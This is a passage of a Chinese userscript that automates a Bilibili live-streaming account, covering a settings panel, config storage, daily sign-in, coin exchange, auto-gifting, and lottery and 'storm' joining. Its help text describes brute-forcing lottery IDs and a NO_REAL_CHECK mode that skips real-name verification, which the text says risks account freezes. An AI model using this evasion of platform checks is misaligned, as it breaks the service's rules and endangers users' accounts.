                            REFRESH_INTERVAL: '设置页面自动刷新的时间间隔，设置为0则不启用，单位为分钟<br>太久导致页面崩溃将无法正常运行脚本'
                        },
                        GUARD_AWARD_CONFIG: {
                            LISTEN_NUMBER: '设置在各大分区中的每一个分区监听的直播间的数量，1~5之间的一个整数<br>可能导致占用大量内存或导致卡顿',
                            CHANGE_ROOM_INTERVAL: '设置在多久之后改变监听的房间，单位为分钟，0表示不改变'
                        },
                        MATERIAL_OBJECT_LOTTERY: '部分房间设有实物奖励抽奖，脚本使用穷举的方式检查是否有实物抽奖<br>请注意中奖后记得及时填写相关信息领取实物奖励',
                        MATERIAL_OBJECT_LOTTERY_CONFIG: {
                            CHECK_INTERVAL: '每次穷举实物抽奖活动ID的时间间隔，单位为分钟',
                            IGNORE_QUESTIONABLE_LOTTERY: '对部分实物抽奖的标题存在疑问，勾选后不参加这部分抽奖'
                        },
                        STORM: '尝试参与节奏风暴<br>如果出现验证码提示的话请尝试实名制后再试',
                        STORM_CONFIG: {
                            NO_REAL_CHECK:'使用移动端模式去抢风暴，不用实名（但是可能造成用户大会员异常冻结，自行取舍）',
                            STORM_MAX_TIME: '单个风暴最大尝试时间（不推荐超过90）',
                            STORM_ONE_LIMIT: '单个风暴参与次数间隔（毫秒）',
                        },
                        HIDE_POPUP: '隐藏位于聊天框下方的抽奖提示框<br>注意：脚本参加抽奖后，部分抽奖仍然可以手动点击参加，为避免小黑屋，不建议点击'
                    },
                    AUTO_GIFT_CONFIG: {
                        ROOMID: '数组,优先送礼物的直播间ID(即地址中live.bilibili.com/后面的数字), 设置为0则无优先房间，小于0也视为0（因为你没有0的勋章）<br>例如：17171,21438956<br>不管[优先高等级]如何设置，会根据[送满全部勋章]（补满或者只消耗当日到期）条件去优先送17171的，再送21438956<br>之后根据[优先高等级]决定送高级还是低级',
                        EXCLUDE_ROOMID: '数组,排除送礼的直播间ID(即地址中live.bilibili.com/后面的数字)，填写的直播间不会自动送礼',
                        GIFT_INTERVAL: '检查间隔(分钟)',
                        GIFT_SORT: '打钩优先赠送高等级勋章，不打勾优先赠送低等级勋章',
                        GIFT_LIMIT: '到期时间范围（秒），86400为1天，时间小于1天的会被送掉',
                        GIFT_DEFAULT: () => (`设置默认送的礼物类型编号，多个请用英文逗号(,)隔开，为空则表示默认不送出礼物<br>${Info.gift_list_str}`),
                        GIFT_ALLOWED: () => (
                            `设置允许送的礼物类型编号(任何未在此列表的礼物一定不会被送出!)，多个请用英文逗号(,)隔开，为空则表示允许送出所有类型的礼物<br><br>${Info.gift_list_str}`
			),
                        SEND_ALL: '打钩 送满全部勋章，否则 送出包裹中今天到期的礼物(会送出"默认礼物类型"之外的礼物，若今日亲密度已满则不送)',
                        AUTO_LIGHT: '自动用小心心点亮亲密度未满且未被排除的灰掉的勋章',
                        AUTO_LIGHT_LIMIT_LEVEL: '自动点亮等级>=设定值的勋章，低于等级的不自动点亮'
                    },
                    SILVER2COIN: '用银瓜子兑换硬币，每天只能兑换一次<br>700银瓜子兑换1个硬币',
                    AUTO_DAILYREWARD: '自动完成每日经验的任务',
                    AUTO_DAILYREWARD_CONFIG: {
                        LOGIN: '自动完成登录任务(凌晨的时候不一定能完成)',
                        WATCH: '自动完成观看任务(凌晨的时候不一定能完成)',
                        COIN: '对你关注的动态中最新几期的视频投币，直到投完设定的数量',
                        SHARE: '自动分享你关注的动态中最新一期的视频(可以完成任务，但实际上不会出现这条动态)'
                    },
                    SHOW_TOAST: '选择是否显示浮动提示，但提示信息依旧会在控制台显示'
                },
                showed: false,
                init: () => {
                    try {
                        const p = $.Deferred();
                        const getConst = (itemname, obj) => {
                            if (itemname.indexOf('-') > -1) {
                                const objname = itemname.match(/(.+?)-/)[1];
                                if (objname && obj[objname]) return getConst(itemname.replace(
                                    `${objname}-`, ''), obj[objname]);
                                else return undefined;
                            }
                            if (typeof obj[itemname] === 'function') return obj[itemname]();
                            return obj[itemname];
                        };
                        const recur = (cfg, element, parentname = undefined) => {
                            for (const item in cfg) {
                                let itemname;
                                if (parentname) itemname = `${parentname}-${item}`;
                                else itemname = item;
                                const id = `${NAME}_config_${itemname}`;
                                const name = getConst(itemname, Essential.Config.NAME);
                                const placeholder = getConst(itemname, Essential.Config.PLACEHOLDER);
                                let e;
                                let h;
                                if (getConst(itemname, Essential.Config.HELP)) h = $(
                                    `<div class="${NAME}_help" id="${id}_help" style="display: inline;"><span class="${NAME}_clickable">?</span></div>`
				);
                                switch ($.type(cfg[item])) {
                                    case 'number':
                                    case 'string':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(
                                            `<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`
					);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'boolean':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(
                                            `<label style="display: inline;" title="${name}"><input id="${id}" type="checkbox" class="${NAME}_input_checkbox">${name}</label>`
					);
                                        if (h) e.append(h);
                                        element.append(e);
                                        if (getConst(`${itemname}_CONFIG`, Essential.Config.NAME)) $(
                                            `#${id}`).addClass(`${NAME}_control`);
                                        break;
                                    case 'array':
                                        e = $(`<div class="${NAME}_setting_item"></div>`);
                                        e.html(
                                            `<label style="display: inline;" title="${name}">${name}<input id="${id}" type="text" class="${NAME}_input_text" placeholder="${placeholder}"></label>`
					);
                                        if (h) e.append(h);
                                        element.append(e);
                                        break;
                                    case 'object':
                                        e = $(`<div id="${id}" style="margin: 0px 0px 8px 12px;"/>`);
                                        element.append(e);
                                        recur(cfg[item], e, itemname);
                                        break;
                                }
                            }
                        };
                        runUntilSucceed(() => {
                            try {
                                let findSp = false;
                                let blancFrames = $('iframe');
                                if (blancFrames && blancFrames.length > 0) {
                                    blancFrames.each((k, v) => {
                                        if (v.src.includes('/blanc/')) {
                                            findSp = true;
                                            window.toast('检查到特殊活动页，尝试跳转...', 'info', 5e3);
                                            setTimeout(() => {
                                                location.replace(v.src);
                                            }, 10);
                                            return false;
                                        }
                                    });
                                }
                                if (findSp) {
                                    p.reject();
                                    return true;
                                }
                                //if (!$('#sidebar-vm div.side-bar-cntr')[0]) return false;
                                if (!$('#sidebar-vm')[0]) return false;
                                // 加载css
                                addCSS(
                                    `.${NAME}_clickable {font-size: 12px;color: #0080c6;cursor: pointer;text-decoration: underline;}
.${NAME}_setting_item {margin: 6px 0px;}
.${NAME}_input_checkbox {vertical-align: bottom;}
.${NAME}_input_text {margin: -2px 0 -2px 4px;padding: 0;}`
				);
                                // 绘制右下角按钮
                                const div_button_span = $('<span>魔改助手设置</span>');
                                div_button_span[0].style =
                                    'font-size: 12px;line-height: 16px;color: #0080c6;';
                                const div_button = $('<div/>');
                                div_button[0].style =
                                    'cursor: pointer;text-align: center;padding: 0px;';
                                const div_side_bar = $('<div/>');
                                div_side_bar[0].style =
                                    'width: 56px;height: 32px;overflow: hidden;position: fixed;right: 0px;bottom: 10%;padding: 4px 4px;background-color: rgb(255, 255, 255);z-index: 10001;border-radius: 8px 0px 0px 8px;box-shadow: rgba(0, 85, 255, 0.0980392) 0px 0px 20px 0px;border: 1px solid rgb(233, 234, 236);';
                                div_button.append(div_button_span);
                                div_side_bar.append(div_button);
                                //$('#sidebar-vm div.side-bar-cntr').first().after(div_side_bar);
                                $('#sidebar-vm').after(div_side_bar);
                                // 绘制设置界面
                                const div_position = $('<div/>');
                                div_position[0].style =
                                    'display: none;position: fixed;height: 300px;width: 350px;bottom: 5%;z-index: 9999;';
                                const div_style = $('<div/>');
                                div_style[0].style =
                                    'display: block;overflow: hidden;height: 300px;width: 350px;border-radius: 8px;box-shadow: rgba(106, 115, 133, 0.219608) 0px 6px 12px 0px;border: 1px solid rgb(233, 234, 236);background-color: rgb(255, 255, 255);';
                                div_position.append(div_style);
                                document.body.appendChild(div_position[0]);
                                // 绘制标题栏及按钮
                                const div_title = $('<div/>');
                                div_title[0].style =
                                    'display: block;border-bottom: 1px solid #E6E6E6;height: 35px;line-height: 35px;margin: 0;padding: 0;overflow: hidden;';
                                const div_title_span = $(
                                    '<span style="float: left;display: inline;padding-left: 8px;font: 700 14px/35px SimSun;">Bilibili直播间挂机助手-魔改</span>'
                                );
                                const div_title_button = $('<div/>');
                                div_title_button[0].style =
                                    'float: right;display: inline;padding-right: 8px;';
                                const div_button_line = $(`<div style="display: inline;"></div>`);
                                const span_button_state = $(
                                    `<span class="${NAME}_clickable">统计</span>`)
                                div_button_line.append(span_button_state);
                                div_button_line.append("  ");
                                const span_button_clear = $(
                                    `<span class="${NAME}_clickable">清除缓存</span>`)
                                div_button_line.append(span_button_clear);
                                div_title_button.append(div_button_line);
                                div_title.append(div_title_span);
                                div_title.append(div_title_button);
                                div_style.append(div_title);
                                // 绘制设置项内容
                                const div_context_position = $('<div/>');
                                div_context_position[0].style =
                                    'display: block;position: absolute;top: 36px;width: 100%;height: calc(100% - 36px);';
                                const div_context = $('<div/>');
                                div_context[0].style =
                                    'height: 100%;overflow: auto;padding: 0 12px;margin: 0px;';
                                div_context_position.append(div_context);
                                div_style.append(div_context_position);
                                recur(Essential.Config.CONFIG_DEFAULT, div_context);
                                // 设置事件
                                div_button.click(() => {
                                    if (!Essential.Config.showed) {
                                        Essential.Config.load();
                                        div_position.css('right', div_side_bar[0].clientWidth +
                                                         'px');
                                        div_position.show();
                                        div_button_span.text('点击保存设置');
                                        div_button_span.css('color', '#ff8e29');
                                    } else {
                                        Essential.Config.save();
                                        div_position.hide();
                                        div_button_span.text('魔改助手设置');
                                        div_button_span.css('color', '#0080c6');
                                        BiliPushUtils.Check.sleepTimeRangeBuild();
                                        if (CONFIG.DD_BP) {
                                            BiliPush.connectWebsocket(true);
                                        } else if (BiliPush.gsocket) {
                                            BiliPush.gsocket.close();
                                        }
                                    }
                                    Essential.Config.showed = !Essential.Config.showed;
                                });
                                span_button_clear.click(() => {
                                    Essential.Cache.clear();
                                    location.reload();
                                });
                                span_button_state.click(() => {
                                    Statistics.showDayGifts();
                                });
                                const getItemByElement = (element) => element.id.replace(
                                    `${NAME}_config_`, '');
                                const getItemByHelpElement = (element) => element.id.replace(
                                    `${NAME}_config_`, '').replace('_help', '');
                                $(`.${NAME}_help`).click(function () {
                                    window.alertdialog('说明', getConst(getItemByHelpElement(
                                        this), Essential.Config.HELP));
                                });
                                $(`.${NAME}_control`).click(function () {
                                    if ($(this).is(':checked')) {
                                        $(
                                            `#${NAME}_config_${getItemByElement(this)}_CONFIG`
					).show();
                                    } else {
                                        $(
                                            `#${NAME}_config_${getItemByElement(this)}_CONFIG`
					).hide();
                                    }
                                });
                                p.resolve();
                                return true;
                            } catch (err) {
                                window.toast('初始化设置界面时出现异常', 'error');
                                console.error(`[${NAME}]`, err);
                                p.reject();
                                return true;
                            }
                        });
                        return p;
                    } catch (err) {
                        window.toast('初始化设置时出现异常', 'error');
                        console.error(`[${NAME}]`, err);
                        return $.Deferred().reject();
                    }
                },
                recurLoad: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                        switch ($.type(cfg[item])) {
                            case 'number':
                            case 'string':
                                e.val(cfg[item]);
                                break;
                            case 'boolean':
                                e.prop('checked', cfg[item]);
                                if (e.is(':checked')) $(`#${NAME}_config_${itemname}_CONFIG`).show();
                                else $(`#${NAME}_config_${itemname}_CONFIG`).hide();
                                break;
                            case 'array':
                                e.val(cfg[item].join(','));
                                break;
                            case 'object':
                                Essential.Config.recurLoad(cfg[item], itemname, cfg_default[item]);
                                break;
                        }
                    }
                },
                recurSave: (cfg, parentname = undefined, cfg_default = Essential.Config.CONFIG_DEFAULT) => {
                    if (Object.prototype.toString.call(cfg) !== '[object Object]') return cfg;
                    for (const item in cfg_default) {
                        let itemname;
                        if (parentname) itemname = `${parentname}-${item}`;
                        else itemname = item;
                        const e = $(`#${NAME}_config_${itemname}`);
                        if (!e[0]) continue;
                        switch ($.type(cfg[item])) {
                            case 'string':
                                cfg[item] = e.val() || '';
                                break;
                            case 'number':
                                cfg[item] = parseFloat(e.val());
                                if (isNaN(cfg[item])) cfg[item] = 0;
                                break;
                            case 'boolean':
                                cfg[item] = e.is(':checked');
                                break;
                            case 'array':
                                var value = e.val().replace(/(\s|\u00A0)+/, '');
                                if (value === '') {
                                    cfg[item] = [];
                                } else {
                                    cfg[item] = value.split(',');
                                    cfg[item].forEach((v, i) => {
                                        cfg[item][i] = parseFloat(v);
                                        if (isNaN(cfg[item][i])) cfg[item][i] = 0;
                                    });
                                }
                                break;
                            case 'object':
                                cfg[item] = Essential.Config.recurSave(cfg[item], itemname, cfg_default[
                                    item]);
                                break;
                        }
                        if (cfg[item] === undefined) cfg[item] = Essential.Config._copy(cfg_default[item]);
                    }
                    return cfg;
                },
                fix: (config) => {
                    // 修正设置项中不合法的参数，针对有输入框的设置项
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER === undefined) config.AUTO_LOTTERY_CONFIG
                        .GUARD_AWARD_CONFIG.LISTEN_NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG
                        .GUARD_AWARD_CONFIG.LISTEN_NUMBER;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER = parseInt(config.AUTO_LOTTERY_CONFIG
                                                                                           .GUARD_AWARD_CONFIG.LISTEN_NUMBER, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER < 1) config.AUTO_LOTTERY_CONFIG
                        .GUARD_AWARD_CONFIG.LISTEN_NUMBER = 1;
                    else if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.LISTEN_NUMBER > 5) config.AUTO_LOTTERY_CONFIG
                        .GUARD_AWARD_CONFIG.LISTEN_NUMBER = 5;

                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL === undefined)
                        config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = Essential.Config.CONFIG_DEFAULT
                            .AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG
                                                                                               .GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG
                        .GIFT_LOTTERY_CONFIG.REFRESH_INTERVAL = 0;

                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL === undefined)
                        config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = Essential.Config
                            .CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = parseInt(config.AUTO_LOTTERY_CONFIG
                                                                                                  .GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL < 0) config.AUTO_LOTTERY_CONFIG
                        .GUARD_AWARD_CONFIG.CHANGE_ROOM_INTERVAL = 0;

                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL ===
                        undefined) config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL =
                        Essential.Config.CONFIG_DEFAULT.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL;
                    config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = parseInt(
                        config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL, 10);
                    if (config.AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL < 0) config
                        .AUTO_LOTTERY_CONFIG.MATERIAL_OBJECT_LOTTERY_CONFIG.CHECK_INTERVAL = 0;

                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER === undefined) config.AUTO_DAILYREWARD_CONFIG
                        .COIN_CONFIG.NUMBER = Essential.Config.CONFIG_DEFAULT.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG
                        .NUMBER;
                    config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER = parseInt(config.AUTO_DAILYREWARD_CONFIG
                                                                                 .COIN_CONFIG.NUMBER, 10);
                    if (config.AUTO_DAILYREWARD_CONFIG.COIN_CONFIG.NUMBER < 0) config.AUTO_DAILYREWARD_CONFIG
                        .COIN_CONFIG.NUMBER = 0;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_TIME < 0) config.AUTO_LOTTERY_CONFIG
                        .STORM_CONFIG.STORM_MAX_TIME = 20;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_MAX_TIME >= 90) config.AUTO_LOTTERY_CONFIG
                        .STORM_CONFIG.STORM_MAX_TIME = 90;
                    if (config.AUTO_LOTTERY_CONFIG.STORM_CONFIG.STORM_ONE_LIMIT < 0) config.AUTO_LOTTERY_CONFIG
                        .STORM_CONFIG.STORM_ONE_LIMIT = 1;
                    if ($.type(CONFIG.AUTO_GIFT_CONFIG.ROOMID) != 'array') {
                        CONFIG.AUTO_GIFT_CONFIG.ROOMID = [0];
                    }
                    if ($.type(CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID) != 'array') {
                        CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID = [0];
                    }
                    if (config.DD_BP_CONFIG.BP_KEY === undefined) config.DD_BP_CONFIG.BP_KEY = Essential.Config.DD_BP_CONFIG.BP_KEY;
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL === undefined) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = Essential.Config.AUTO_GIFT_CONFIG.GIFT_INTERVAL;
                    if (config.AUTO_GIFT_CONFIG.GIFT_INTERVAL < 1) config.AUTO_GIFT_CONFIG.GIFT_INTERVAL = 1;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT === undefined) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = Essential.Config.AUTO_GIFT_CONFIG.GIFT_LIMIT;
                    if (config.AUTO_GIFT_CONFIG.GIFT_LIMIT < 0) config.AUTO_GIFT_CONFIG.GIFT_LIMIT = 86400;
                    if (config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE === undefined) config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE = Essential.Config.AUTO_LOTTERY_CONFIG.SLEEP_RANGE;
                    if (config.DD_BP === undefined) config.DD_BP = Essential.Config.DD_BP;
                    if (config.DD_BP_CONFIG.DM_STORM === undefined) config.DD_BP_CONFIG.DM_STORM = Essential.Config.DD_BP_CONFIG.DM_STORM;
                    if (config.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL === undefined) config.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL = Essential.Config.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL;
                    return config;
                },
                _copy: (obj) => {
                    return JSON.parse(JSON.stringify(obj));
                },
                load: () => {
                    try {
                        CONFIG = JSON.parse(localStorage.getItem(`${NAME}_CONFIG`)) || {};
                        CONFIG = Essential.Config.fix(CONFIG);
                        if (Object.prototype.toString.call(CONFIG) !== '[object Object]') throw new Error();
                    } catch (e) {
                        CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    }
                    Essential.Config.recurLoad(CONFIG);
                    DEBUG('Essential.Config.load: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    BiliPushUtils.Check.sleepTimeRangeBuild();
                },
                save: () => {
                    CONFIG = Essential.Config.recurSave(CONFIG);
                    CONFIG = Essential.Config.fix(CONFIG);
                    Essential.DataSync.down();
                    DEBUG('Essential.Config.save: CONFIG', CONFIG);
                    localStorage.setItem(`${NAME}_CONFIG`, JSON.stringify(CONFIG));
                    window.toast('设置已保存，部分设置需要刷新后生效', 'success');
                },
                clear: () => {
                    CONFIG = Essential.Config._copy(Essential.Config.CONFIG_DEFAULT);
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CONFIG`);
                }
            }, // Need Init After Toast.init and AlertDialog.init
            Cache: {
                load: () => {
                    try {
                        CACHE = JSON.parse(localStorage.getItem(`${NAME}_CACHE`));
                        if (Object.prototype.toString.call(CACHE) !== '[object Object]') throw new Error();
                        if (CACHE.version !== VERSION) {
                            CACHE.version = VERSION;
                            //Essential.Cache.clear();
                        }
                    } catch (err) {
                        CACHE = {
                            version: VERSION
                        };
                        localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                    }
                    DEBUG('Essential.Cache.load: CACHE', CACHE);
                },
                save: () => {
                    localStorage.setItem(`${NAME}_CACHE`, JSON.stringify(CACHE));
                },
                clear: () => {
                    CACHE = {
                        version: VERSION
                    };
                    Essential.DataSync.down();
                    localStorage.removeItem(`${NAME}_CACHE`);
                }
            },
            DataSync: {
                init: () => {
                    window[NAME] = {};
                    window[NAME].iframeSet = new Set();
                },
                down: () => {
                    try {
                        window[NAME].Info = Info;
                        window[NAME].CONFIG = CONFIG;
                        window[NAME].CACHE = CACHE;
                        for (const iframe of window[NAME].iframeSet) {
                            if (iframe.promise.down) iframe.promise.down.resolve();
                        }
                    } catch (err) {}
                }
            }
        }; // Only Run in MainScript, Need Init after Toast.init

        const Sign = {
            run: () => {
                try {
                    if (!CONFIG.AUTO_SIGN) return $.Deferred().resolve();
                    if (CACHE.sign_ts && !checkNewDay(CACHE.sign_ts)) {
                        // 同一天，不再检查签到
                        runTomorrow(Sign.run);
                        return $.Deferred().resolve();
                    }
                    return API.sign.doSign().then((response) => {
                        DEBUG('Sign.run: API.sign.doSign', response);
                        if (response.code === 0) {
                            // 签到成功
                            window.toast(`[自动签到]${response.data.text}`, 'success');
                            CACHE.sign_ts = ts_ms();
                            Essential.Cache.save();
                        } else if (response.code === -500 || response.message.indexOf('已') > -1) {
                            // 今天已签到过
                        } else {
                            window.toast(`[自动签到]${response.data.text}`, 'caution');
                            return Sign.run();
                        }
                        runTomorrow(Sign.run);
                    }, () => {
                        window.toast('[自动签到]签到失败，请检查网络', 'error');
                        return delayCall(() => Sign.run());
                    });
                } catch (err) {
                    window.toast('[自动签到]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            }
        }; // Once Run every day

        const Exchange = {
            run: () => {
                try {
                    if (!CONFIG.SILVER2COIN) return $.Deferred().resolve();
                    if (CACHE.exchange_ts && !checkNewDay(CACHE.exchange_ts)) {
                        // 同一天，不再兑换硬币
                        runTomorrow(Exchange.run);
                        return $.Deferred().resolve();
                    }
                    return Exchange.silver2coin().then(() => {
                        CACHE.exchange_ts = ts_ms();
                        Essential.Cache.save();
                        runTomorrow(Exchange.run);
                    }, () => delayCall(() => Exchange.run()));
                } catch (err) {
                    window.toast('[银瓜子换硬币]运行时出现异常，已停止', 'error');
                    console.error(`[${NAME}]`, err);
                    return $.Deferred().reject();
                }
            },
            silver2coin: () => {
                return API.Exchange.silver2coin().then((response) => {
                    DEBUG('Exchange.silver2coin: API.SilverCoinExchange.silver2coin', response);
                    if (response.code === 0) {
                        // 兑换成功
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'success');
                    } else if (response.code === 403) {
                        // 每天最多能兑换 1 个
                        // 银瓜子余额不足
                        // window.toast(`[银瓜子换硬币]'${response.msg}`, 'info');
                    } else {
                        window.toast(`[银瓜子换硬币]${response.msg}`, 'caution');
                    }
                }, () => {
                    window.toast('[银瓜子换硬币]兑换失败，请检查网络', 'error');
                    return delayCall(() => Exchange.silver2coin());
                });
            }
        }; // Once Run every day

        const Gift = {
            interval: 600e3,
            run_timer: undefined,
            over: false,
            light_gift: 30607,
            getMedalList: async () => {
                try {
                    let medal_list = [],
                        curPage = 1,
                        totalpages = 0;
                    do {
                        let response = await API.i.medal(curPage, 25);
                        DEBUG('Gift.getMedalList: API.i.medal', response);
                        medal_list = medal_list.concat(response.data.fansMedalList);
                        curPage = response.data.pageinfo.curPage;
                        totalpages = response.data.pageinfo.totalpages;
                        curPage++;
                    } while (curPage < totalpages);
                    return medal_list;
                } catch (e) {
                    window.toast('[自动送礼]获取勋章列表失败，请检查网络', 'error');
                    return await delayCall(() => Gift.getMedalList());
                }
            },
            getBagList: async () => {
                try {
                    let response = await API.gift.bag_list();
                    DEBUG('Gift.getBagList: API.gift.bag_list', response);
                    Gift.time = response.data.time;
                    return response.data.list;
                } catch (e) {
                    window.toast('[自动送礼]获取包裹列表失败，请检查网络', 'error');
                    return await delayCall(() => Gift.getBagList());
                }
            },
            getFeedByGiftID: (gift_id) => {
                let gift_info = Info.gift_list.find(r=>r.id==gift_id);
                if(gift_info){
                    if(gift_info.price > 0){
                        return Math.ceil(gift_info.price / 100);
                    }else if(gift_info.rights){
                        let group = gift_info.rights.match(/亲密度\+(\d+)/);
                        if(group){
                            return Math.ceil(group[1]);
                        }
                    }
                }
                return 0;
            },
            sort_medals: (medals) => {
                if (CONFIG.AUTO_GIFT_CONFIG.GIFT_SORT) {
                    medals.sort((a, b) => {
                        if (b.level - a.level == 0) {
                            return b.intimacy - a.intimacy;
                        }
                        return b.level - a.level;
                    });
                } else {
                    medals.sort((a, b) => {
                        if (a.level - b.level == 0) {
                            return a.intimacy - b.intimacy;
                        }
                        return a.level - b.level;
                    });
                }
                if (CONFIG.AUTO_GIFT_CONFIG.ROOMID && CONFIG.AUTO_GIFT_CONFIG.ROOMID.length > 0) {
                    let sortRooms = CONFIG.AUTO_GIFT_CONFIG.ROOMID;
                    sortRooms.reverse();
                    for (let froom of sortRooms) {
                        let rindex = medals.findIndex(r => r.roomid == froom);
                        if (rindex != -1) {
                            let tmp = medals[rindex];
                            medals.splice(rindex, 1);
                            medals.unshift(tmp);
                        }
                    }
                }
                return medals;
            },
            auto_light: async (medal_list) => {
                try {
                    const feed = Gift.getFeedByGiftID(Gift.light_gift);
                    let noLightMedals = medal_list.filter(it => it.is_lighted == 0 && it.day_limit - it.today_feed >= feed
                                                          && CONFIG.AUTO_GIFT_CONFIG.EXCLUDE_ROOMID.findIndex(exp => exp == it.roomid) == -1
                                                          && CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT_LIMIT_LEVEL<=it.level);
                    if (noLightMedals && noLightMedals.length > 0) {
                        noLightMedals = Gift.sort_medals(noLightMedals);
                        let bag_list = await Gift.getBagList();
                        let heartBags = bag_list.filter(r => r.gift_id == Gift.light_gift);
                        if (heartBags && heartBags.length > 0) {
                            for (let medal of noLightMedals) {
                                let gift = heartBags.find(it => it.gift_id == Gift.light_gift && it.gift_num > 0);
                                if (gift) {
                                    let remain_feed = medal.day_limit - medal.today_feed;
                                    if (remain_feed - feed >= 0) {
                                        let response = await API.room.room_init(parseInt(medal.roomid, 10));
                                        let send_room_id = parseInt(response.data.room_id, 10);
                                        let feed_num = 1;
                                        let rsp = await API.gift.bag_send(Info.uid, gift.gift_id, medal.target_id,feed_num, gift.bag_id, send_room_id, Info.rnd);
                                        if (rsp.code === 0) {
                                            gift.gift_num -= feed_num;
                                            medal.today_feed += feed_num * feed;
                                            remain_feed -= feed_num * feed;
                                            window.toast(
                                                `[自动送礼]勋章[${medal.medalName}] 点亮成功，送出${feed_num}个${gift.gift_name}，[${medal.today_feed}/${medal.day_limit}]距离升级还需[${remain_feed}]`,
                                                'success');
                                        } else {
                                            window.toast(`[自动送礼]勋章[${medal.medalName}] 点亮异常:${rsp.msg}`,
                                                         'caution');
                                        }
                                    }
                                    continue;
                                }
                                break;
                            }
                        }
                    }
                } catch (e) {
                    console.error(e);
                    window.toast(`[自动送礼]点亮勋章 检查出错:${e}`, 'error');
                }
            },
            run: async () => {
                const func = () => {
                    window.toast('[自动送礼]送礼失败，请检查网络', 'error');
                    return delayCall(() => Gift.run());
                };
                try {
                    if (!CONFIG.AUTO_GIFT) return;
                    if (Gift.run_timer) clearTimeout(Gift.run_timer);
                    Gift.interval = CONFIG.AUTO_GIFT_CONFIG.GIFT_INTERVAL * 60e3;
                    if (CACHE.gift_ts) {
                        const diff = ts_ms() - CACHE.gift_ts;
                        if (diff < Gift.interval) {
                            Gift.run_timer = setTimeout(Gift.run, Gift.interval - diff);
                            return;
                        }
                    }
                    Gift.over = false;
                    let medal_list = await Gift.getMedalList();
                    if (CONFIG.AUTO_GIFT_CONFIG.AUTO_LIGHT) {
                        await Gift.auto_light(medal_list);
                    }
                    DEBUG('Gift.run: Gift.getMedalList().then: Gift.medal_list', medal_list);
                    if (medal_list && medal_list.length > 0) {
                        medal_list = medal_list.filter(it => it.day_limit - it.today_feed > 0 && it.level <
                                                       20);
                        medal_list = Gift.sort_medals(medal_list);
